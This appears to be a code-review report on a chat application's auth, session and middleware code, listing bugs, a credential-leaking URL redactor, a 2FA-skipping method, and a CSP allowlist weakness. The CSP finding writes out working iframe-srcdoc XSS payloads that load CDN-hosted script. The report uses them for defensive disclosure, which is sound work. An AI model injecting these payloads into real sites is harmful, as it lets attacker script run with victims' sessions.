# core: auth, sessions, middleware, models

## Overview

The process-wide auth and chat-session state. `core/auth.py` owns users, password hashing,
TOTP/backup codes, browser session tokens, reserved usernames, and the `data/auth.json` store;
`core/session_manager.py` owns the chat-session cache and every message/transcript write;
`core/models.py` is the pure dataclass pair those two share; `core/middleware.py` is the
`require_admin` gate, the internal-tool token, and the security-header middleware;
`core/log_safety.py` is the log redactor for endpoint URLs.

The boundary: the request-time auth middleware, the API-token cache and the auth-exempt path
list live in `app.py`, assigned to `build-install-deploy`; the routes that call these APIs are
assigned to the `routes-*` sections; the production session cleanup is `src/cleanup_service.py`
via `routes/cleanup/cleanup_routes.py`, not this section's `SessionManager`; the owner and
privilege vocabulary is `src/owner_identity.py` / `src/auth_helpers.py` (`src-platform`).

## Coverage

**Read fully:**

| File | Lines |
| --- | ---: |
| `core/auth.py` | 680 |
| `core/log_safety.py` | 27 |
| `core/middleware.py` | 152 |
| `core/models.py` | 191 |
| `core/session_manager.py` | 782 |
| `tests/test_session_manager_cleanup.py` | 29 |
| `tests/test_log_safety.py` | 27 |
| `specs/auth-security.md` | 169 |

**Read partially:**

- `app.py` at the auth middleware (`:265-500`) — the token cache, bearer verification and
  internal-tool bypass
- `routes/session_routes.py` at `list_sessions` (`:250-357`), `create_session` (`:359-495`),
  `inject_messages` (`:573-608`), archive/unarchive (`:730-797`),
  `sessions_save_now`/`session/openai` (`:932-966`), the important route (`:967-1003`) and
  `auto_sort_sessions` (`:1084-1100`, `:1175-1190`)
- `routes/auth_routes.py` at login (`:168-182`), change-password (`:228-239`), 2FA
  setup/confirm/disable, user delete/rename (`:336-470`) and `:592`
- `routes/chat_helpers.py` at `resolve_session_auth` (`:455-514`)
- `src/auth_helpers.py` at `effective_user` (`:15-36`)
- `src/agent_tools/session_tools.py` at `create_session` (`:50-70`) and `list_sessions` (`:104`)
- `src/ai_interaction.py` at the model-switch handler (`:705-725`)
- `src/cleanup_service.py` (`:1-160`) and `routes/cleanup/cleanup_routes.py`
- `src/endpoint_resolver.py` at `resolve_url`, `normalize_base`, `_prepare_endpoint_base` and
  `build_chat_url` (`:209-285`)
- `routes/model_routes.py` at endpoint create (`:1989-2060`) and the probe log sites (`:1015-1045`)
- `tests/test_history_display_model_hydration.py` (the drift, hydration and fork tests, `:1-407`),
  `tests/test_auth_session_revocation.py` (`:1-130`), `tests/test_rename_user_owner_sync.py`
  (`:1-40`), `tests/test_session_list_owner_scope.py` (by search only)
- `specs/persistence.md` and `specs/chat.md` at their session-relevant lines

**Not read:**

- `core/database.py` (the session/message schema and migrations — assigned to `core-data-platform`)
- the bodies of the `routes-*` handlers beyond the regions above
- the front end's session list/search code (`static/js/sessions.js` beyond the endpoints it fetches)
- `src/task_scheduler.py`'s session use

**Checks run:** four probes under `venv/bin/python` — a 104-row cache probe (finding 1), a
`cleanup_empty_sessions` run against a real SQLite row (finding 3), a `create_session` +
`save_sessions` + `sync_session_metadata` sequence (finding 2), and `redact_url` over a
scheme-less endpoint URL after `build_chat_url` (finding 4); plus caller greps for
`save_sessions`, `get_sessions_for_user`, `cleanup_empty_sessions` and
`AuthManager.create_session`. The three test files cited above: `15 passed`
(`tests/test_session_manager_cleanup.py`, `tests/test_log_safety.py`,
`tests/test_auth_session_revocation.py`).

### [BUG] The sidebar list is served from a global 100-row cache, so one user's sessions can hide another's

- **Location:** `core/session_manager.py:96-98` (with `routes/session_routes.py:289`, `:352`, and `core/session_manager.py:700-707`)
- **Severity:** medium
- **Disposition:** next
- **Evidence:** `load_sessions` caches one global, owner-agnostic slice:

  ```python
  db_sessions = db.query(DbSession).filter(
      DbSession.archived == False,
      DbSession.messages.any(),
  ).order_by(DbSession.last_accessed.desc()).limit(100).all()
  ```

  `get_sessions_for_user` then filters that same dict, and `GET /api/sessions` builds its
  response from it:

  ```python
  user_sessions = session_manager.get_sessions_for_user(user)   # routes/session_routes.py:289
  ...
  for s in user_sessions.values()                               # routes/session_routes.py:352
  ```

  Measured with a temp SQLite DB holding 101 recent sessions for `alice`, two older ones for
  `bob`, and one message-less `alice` session:

  ```
  cached sessions: 100 by owner: {'alice': 100}
  bob's sessions visible via get_sessions_for_user: []
  alice-empty cached: False
  ```

- **Impact:** after every process start, `GET /api/sessions` can only return the 100 sessions
  whose `last_accessed` is newest across all owners. On a multi-user instance the quieter
  account's sidebar is empty even though its rows are in the database (the same user can still
  reach them through `/api/search` or by opening the id). A session with no messages is never
  cached at all, so a draft chat created before a restart also disappears from the list. The
  rows are not lost, and the route already queries every non-archived row of the owner for its
  metadata maps (`routes/session_routes.py:301-302`); only the list itself comes from the cache.
- **Fix:** build the response from the rows the route already selects (add `DbSession.name`,
  `model`, `endpoint_url` and `rag` to that query), or make `load_sessions` cache per owner.
  Deleting the cache dependency also removes the empty-session special case.

### [BUG] `save_sessions()` is a no-op that three call sites treat as a persist, and the next `get_session` overwrites what they set

- **Location:** `core/session_manager.py:709-710` (with `:483`, `routes/session_routes.py:961-962`, `src/agent_tools/session_tools.py:59-61`, `src/ai_interaction.py:716-717`)
- **Severity:** low
- **Disposition:** next
- **Evidence:** the method body is the docstring:

  ```python
  def save_sessions(self):
      """No-op for DB compatibility."""
  ```

  `sync_session_metadata`, which every `get_session` calls (`:441`), re-reads the row over the
  in-memory object:

  ```python
  session.headers = headers or {}      # core/session_manager.py:483
  ```

  Measured sequence, mirroring `routes/session_routes.py:953-962`:

  ```
  DB headers after save_sessions(): {}
  in-memory headers before get_session: {'Authorization': 'Bearer sk-[REDACTED]'}
  in-memory headers after get_session: {}
  ```

  There are 22 non-test `save_sessions()` call sites (`grep -rn '\.save_sessions()' src/ routes/`
  minus the definition).
- **Impact:** in-memory `Session` fields written after the row was created (`headers`, and any
  `name`/`model`/`endpoint_url` not persisted through a DB update) are silently discarded on the
  next read. `/session/openai` is the clearest case: it builds `Authorization` from the server's
  `OPENAI_API_KEY`, calls the no-op, and the next `get_session` — the chat send — hands the model
  call an empty header dict. The chat path re-derives auth only when an enabled `ModelEndpoint`
  row matches the session URL (`routes/chat_helpers.py:458-514`), so an env-key-only setup sends
  the request unauthenticated. The agent's `create_session` tool with explicit `headers` and the
  UI's `switch_model` action have the same shape and rely on the same recovery. The main create
  route is not affected: it persists headers through `_persist_session_headers`
  (`routes/session_routes.py:189-196`, called at `:478-479`).
- **Fix:** delete `save_sessions` and its 22 call sites (they are vestigial from the JSON-file
  store), or make it write the dirty fields; and persist the headers at the three sites that set
  them, the way `_persist_session_headers` does.

### [BUG] `cleanup_empty_sessions` raises on its first empty session and rolls back the whole run

- **Location:** `core/session_manager.py:751-756` (with the re-raise at `:775-778`)
- **Severity:** low
- **Disposition:** backlog
- **Evidence:** the delete branch compares an aware datetime with a naive one:

  ```python
  if db_session.message_count == 0:
      if db_session.created_at is not None:
          created = db_session.created_at
          if created.tzinfo is None:
              created = created.replace(tzinfo=timezone.utc)
          if created > min_age:              # min_age = utcnow_naive() - ...
              continue  # Too young to delete
  ```

  The `except` at `:775-778` logs, rolls back and re-raises. Measured against a real SQLite row
  (one 90-day-old empty session, one 90-day-old session with messages):

  ```
  RAISED: TypeError can't compare offset-naive and offset-aware datetimes
  rows after cleanup: [('empty-old', False, 0), ('old-full', False, 3)]
  ```

  Nothing is called in production: the only caller is `tests/test_session_manager_cleanup.py`,
  which passes a `SimpleNamespace` with no `created_at` and therefore exercises only the archive
  branch. The route-reachable cleanup is `src/cleanup_service.py` via
  `routes/cleanup/cleanup_routes.py:50`.
- **Impact:** the method cannot delete any empty session, and because the comparison fails
  inside the loop, the archive work it did for earlier rows in the same pass is rolled back too
  (`old-full` stays `archived=False`). Since nothing calls it, the impact today is an unusable
  cleanup API and a test that pins only the branch that works; wiring it into a route would
  produce a 500 and no cleanup.
- **Fix:** compare in one frame — keep `min_age` and `created` both naive, or both aware; or
  delete the method and its test, since `src/cleanup_service.py` owns the live path.

### [SECURITY] `redact_url` returns a scheme-less URL unchanged, including its userinfo

- **Location:** `core/log_safety.py:18-25`
- **Severity:** low
- **Disposition:** next
- **Evidence:** `urlparse` treats `user:pass@host/v1` as scheme `user` plus path
  `pass@host/v1`, so `parsed.hostname` is empty and the reconstruction returns the input:

  ```python
  parsed = urlparse(url or "")
  host = parsed.hostname or ""
  ...
  return urlunparse((parsed.scheme, host, parsed.path, "", "", ""))
  ```

  Measured:

  ```
  'user:pass@host/v1' -> build_chat_url -> 'user:pass@host/v1/chat/completions' -> redact -> 'user:pass@host/v1/chat/completions'
  ```

  The input is accepted by the endpoint route, which validates only that the base URL is
  non-empty (`routes/model_routes.py:2011-2013`) and whose `resolve_url` returns the string
  unchanged when `urlparse` finds no hostname (`src/endpoint_resolver.py:211-214`); the model
  probe then logs the redacted form at WARNING on failure (`routes/model_routes.py:1033-1044`),
  as does the chat route (`routes/chat_routes.py:728`, `:1670`). `tests/test_log_safety.py:26-27`
  claims the no-userinfo-survives property but only asserts it for a garbage string.
- **Impact:** an admin-configured endpoint whose base URL lacks a scheme but embeds credentials
  (`user:pass@host`) writes that password to the application log on every failed probe. The
  module docstring names this exact input class ("Endpoint URLs configured by admins can embed
  credentials in the userinfo") as the reason the helper exists, so the guard is expected to
  cover it.
- **Fix:** when `parsed.scheme` is empty, strip a leading `userinfo@` from the path before
  returning (or return `<endpoint>`), and add the scheme-less case to `tests/test_log_safety.py`.

### [FOOTGUN] `AuthManager.create_session()` issues a session from the password alone

- **Location:** `core/auth.py:574-579`
- **Severity:** low
- **Disposition:** next
- **Evidence:** the method verifies the password and skips the second factor entirely:

  ```python
  def create_session(self, username: str, password: str) -> Optional[str]:
      """Verify credentials and return a session token, or None."""
      username = username.strip().lower()
      if not self.verify_password(username, password):
          return None
      return self.create_session_trusted(username)
  ```

  Its callee's docstring states the contract it does not enforce — "Call only after
  verify_password (and TOTP if enabled) have passed" (`:581-583`) — and the login route performs
  the three steps in order (`routes/auth_routes.py:171-181`). `grep -rn '\.create_session(' src/
  routes/ core/` finds no production caller; the hits are `SessionManager.create_session` (a
  different class) and test helpers such as `tests/test_auth_session_revocation.py:51-53`. The
  spec states the invariant the method would break: "TOTP is checked before session issuance"
  (`specs/auth-security.md`).
- **Impact:** none today. The next caller that reaches for the natural-looking
  `auth_manager.create_session(user, password)` — a new login path, a CLI, a migration script —
  issues a seven-day session for a 2FA-enabled account after only the password. The safe path is
  a three-call sequence the method hides.
- **Fix:** delete the method, or make it fail closed for 2FA users
  (`if self.totp_enabled(username): return None`) and name it for what it does.

### [SECURITY] `script-src` allowlists `cdn.jsdelivr.net`, so injected markup runs attacker-hosted script through a `srcdoc` frame

- **Location:** `core/middleware.py:143`
- **Severity:** medium
- **Disposition:** fix-now
- **Evidence:** the policy for every app page lets scripts load from a public CDN:

  ```python
  # core/middleware.py:141-144
  response.headers["Content-Security-Policy"] = (
      "default-src 'self'; "
      f"script-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net; "
  ```

  `cdn.jsdelivr.net` serves any file from any public npm package or GitHub repository
  (`/npm/<package>@<version>/<file>`, `/gh/<user>/<repo>@<ref>/<file>`), so the allowlist admits
  script an attacker publishes. A `<script>` element assigned through `innerHTML` does not run, and
  an inline handler is refused for lack of `'unsafe-inline'`. An `<iframe srcdoc>` assigned through
  `innerHTML` does load: its document inherits the parent's policy and origin, its `<script src>` is
  parser-inserted, and the source matches the allowlist. `frame-src 'self'` does not stop it.

  Measured on 2026-10-05 in headless Chromium, on a page served with the policy string above (nonce
  fixed for the probe), with the real CDN and three shipped sinks:

  | Sink | Input | Result |
  | --- | --- | --- |
  | `static/js/spinner.js`, imported unmodified and driven as `chat.js:2042` and `:3153` drive it | title `<iframe srcdoc="<script src=https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js></script>">` | `cdn script ran in frame; lodash 4.17.21; frame origin http://127.0.0.1:9101` |
  | The same spinner | title `<img src=x onerror="document.title=1">` | `no execution` |
  | `_locHTML`, `static/js/calendar.js:3437-3449`, copied by line range | location `https://maps.example.test/room5 <iframe srcdoc="<script src=https&colon;//cdn.jsdelivr.net/…></script>">` | `cdn script ran; lodash 4.17.21`, same origin as the page |
  | The swatch template, `static/js/theme.js:660-671`, copied by line range | theme name `<iframe/srcdoc="<script/src=https://cdn.jsdelivr.net/…></script>">`, as `src/ai_interaction.py:759` leaves it | `cdn script ran; lodash 4.17.21`, same origin as the page |

  The frame's origin equals the page's, so its script reaches `parent`. A control with a stand-in
  allowlisted origin serving `parent.document.title='PWNED'` changed the parent's title. lodash
  stands in for an attacker's file; no attacker-controlled package was published for the probe.
- **Impact:** the policy does not stop script execution for any sink that parses attacker text as
  element content. The injected script runs with the user's session and `connect-src 'self'`, so it
  can call every API the user can, which for an admin includes the shell routes. Seven findings in
  this run describe such sinks and rated them on the assumption that the policy held:

  | Sink | Section | Attacker input |
  | --- | --- | --- |
  | Research spinner | `static-js-chat` | A search result's title |
  | Calendar event location | `static-js-documents-email` | A synced or imported event |
  | Theme grid and `/theme` reply | `static-js-rest`, `static-js-chat` | A theme name from the model's `ui_control` call |
  | Metrics popup, model picker | `static-js-chat`, `static-js-cookbook-settings-models` | A configured endpoint's model id or name |
  | Task form textarea | `static-js-rest` | A model-authored task prompt |
  | Research report body | `static-js-research-memory-rag` | Page text in a report; the branch is unreachable today |

  This finding is medium because it needs one of those sinks. The first two are rated high in their
  own sections; the policy is counted once, here. Attribute-only injection, as in the email chip
  finding in `static-js-documents-email`, cannot create a frame and is not affected.
- **Fix:** remove `https://cdn.jsdelivr.net` from `script-src`. Its one consumer is the Pyodide
  loader (`static/js/codeRunner.js:156`): serve Pyodide from `/static/`, or load it inside a
  sandboxed frame that carries its own policy. Fix the sinks as well; the policy is the second
  layer, and it is the layer that failed.
